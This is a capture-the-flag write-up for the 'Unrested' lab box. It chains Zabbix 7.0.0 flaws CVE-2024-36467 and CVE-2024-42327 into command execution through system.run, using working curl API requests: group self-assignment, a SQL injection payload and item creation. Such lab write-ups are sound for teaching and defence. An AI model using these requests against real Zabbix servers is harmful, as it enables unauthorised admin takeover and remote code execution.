## Overview

Unrested is a medium-difficulty Linux box built around a Zabbix 7.0.0 monitoring server. You start with low-privilege Zabbix web credentials (`matthew`), and the path to a shell runs entirely through the Zabbix API: a missing-authorization flaw to grab admin group membership, a blind SQL injection to steal the real admin's session, and finally the legitimate `system.run` item feature to execute commands on the host. This post covers recon through the user flag.

CVE is the whole path: chaining Zabbix 7.0.0 CVE-2024-36467 missing-auth with CVE-2024-42327 blind SQLi via a custom session-stealer script into system.run RCE; minimal recon, low CTF feel.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 8.9p1 (Ubuntu) | no creds for it |
| 80/tcp | Apache 2.4.52 | redirects to a Zabbix login |
| 10050/tcp | Zabbix agent | source-filtered |
| 10051/tcp | Zabbix trapper/server | — |

```bash
nmap -sC -sV 10.129.231.176
```

Port 80 lands on a Zabbix login. The provided `matthew` credentials work, and the dashboard footer reveals the version: **Zabbix 7.0.0** — vulnerable to both CVE-2024-36467 and CVE-2024-42327.

## Enumeration

Everything happens over the JSON-RPC API at `/zabbix/api_jsonrpc.php`. First, authenticate to get a session token (in Zabbix the session ID *is* the API auth token):

```bash
curl -s -X POST 'http://10.129.231.176/zabbix/api_jsonrpc.php' \
  -H 'Content-Type: application/json-rpc' \
  --data '{"jsonrpc":"2.0","method":"user.login","params":{"username":"matthew","password":"<redacted>"},"id":1}'
```

The `matthew` account holds the default User role — no host visibility, no item creation. The two CVEs are what bridge that gap.

## Foothold

**1 — Self-assign admin groups (CVE-2024-36467).** Zabbix's `user.update` only blocks a user from changing their own `roleid`; it never validates the `usrgrps` array. So `matthew` (userid 3) can add himself to user group 7 (Zabbix administrators) and 13 (Internal):

```bash
curl -s -X POST 'http://10.129.231.176/zabbix/api_jsonrpc.php' \
  -H 'Content-Type: application/json-rpc' \
  --data '{"jsonrpc":"2.0","method":"user.update","params":{"userid":"3","usrgrps":[{"usrgrpid":"13"},{"usrgrpid":"7"}]},"auth":"<token>","id":1}'
```

**2 — Confirm the selectRole SQL injection (CVE-2024-42327).** The `selectRole` parameter of `user.get` is concatenated straight into the query, and `editable:1` bypasses the group permission filter. A `SLEEP(5)` proves the injection:

```bash
time curl -s -X POST 'http://10.129.231.176/zabbix/api_jsonrpc.php' \
  -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","method":"user.get","params":{"output":["userid","username"],"selectRole":["roleid","name AND (SELECT 1 FROM (SELECT SLEEP(5))A)"],"editable":1},"auth":"<token>","id":1}'
```

**3 — Leak the admin session.** A blind, character-by-character extraction pulls the active Admin (userid 1) session ID out of `zabbix.sessions`. Threaded, it finishes in well under a minute:

```bash
python3 poc.py
# -> Admin session: <redacted 32-char sessionid>
```

**4 — Become admin and find a host.** Using the leaked session ID as the auth token, `host.get` now returns the Zabbix server host and its interface:

```bash
curl -s -X POST 'http://10.129.231.176/zabbix/api_jsonrpc.php' \
  -H 'Content-Type: application/json-rpc' \
  --data '{"jsonrpc":"2.0","method":"host.get","params":{"output":["hostid","host"],"selectInterfaces":["interfaceid"]},"auth":"<admin_session>","id":1}'
# -> hostid 10084, interfaceid 1
```

**5 — Execute commands via system.run.** Creating an item with key `system.run[<cmd>]` and forcing it to poll runs the command on the host. Using a text item lets the output be read straight back out of the API — no inbound shell required:

```bash
# create the item (value_type 4 = text, captures stdout)
curl -s -X POST 'http://10.129.231.176/zabbix/api_jsonrpc.php' -H 'Content-Type: application/json-rpc' \
  --data '{"jsonrpc":"2.0","method":"item.create","params":{"name":"rce","key_":"system.run[id]","delay":1,"hostid":"10084","type":0,"value_type":4,"interfaceid":"1"},"auth":"<admin_session>","id":1}'
# force an immediate poll
curl -s -X POST 'http://10.129.231.176/zabbix/api_jsonrpc.php' -H 'Content-Type: application/json-rpc' \
  --data '{"jsonrpc":"2.0","method":"task.create","params":[{"type":"6","request":{"itemid":"<itemid>"}}],"auth":"<admin_session>","id":1}'
# read the output
curl -s -X POST 'http://10.129.231.176/zabbix/api_jsonrpc.php' -H 'Content-Type: application/json-rpc' \
  --data '{"jsonrpc":"2.0","method":"item.get","params":{"itemids":"<itemid>","output":["lastvalue"]},"auth":"<admin_session>","id":1}'
# -> uid=114(zabbix) gid=121(zabbix) groups=121(zabbix)
```

Code execution as `zabbix`.
